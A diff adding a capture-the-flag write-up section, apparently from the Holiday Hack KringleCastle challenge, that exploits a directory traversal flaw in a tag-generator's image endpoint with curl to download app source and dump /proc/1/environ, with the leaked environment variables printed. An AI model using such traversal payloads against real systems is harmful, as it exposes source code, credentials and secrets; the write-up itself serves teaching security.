@@ -736,6 +736,44 @@ https://greeting-cards.kringlecastle.com/
 
 https://tag-generator.kringlecastle.com/
 
+First, try to upload an invalid file, like "test.txt"
+
+```
+Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201220-1-1lvj6ur.txt
+```
+
+Now we know the full path and filename of the application. 
+
+If we try uploading a valid png/jpg file and watch the browser's DevTools Network tab, we see the /image?id=xxx endpoint returns our uploaded image back to us.
+
+Trying directory traversal with the full path to the web app, we can download the source code of the app:
+
+```bash
+$ curl --location --request GET 'https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb'
+```
+
+That's cool, but we really want value of an environment variable. Maybe we can get that env var from the /proc/ filesystem using the same directory traversal trick?
+
+```bash
+$ curl -o- -s 'https://tag-generator.kringlecastle.com/image?id=../proc/1/environ' | sed 's/\x00/\n/g'
+
+PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=cbf2810b7573
+RUBY_MAJOR=2.7
+RUBY_VERSION=2.7.0
+RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343
+GEM_HOME=/usr/local/bundle
+BUNDLE_SILENCE_ROOT_WARNING=1
+BUNDLE_APP_CONFIG=/usr/local/bundle
+APP_HOME=/app
+PORT=4141
+HOST=0.0.0.0
+GREETZ=JackFrostWasHere
+HOME=/home/app
+```
+
+Yes, yes we can :)
+
 
 ## Snowball Fight
 * Location: Speaker UNPreparedness Room
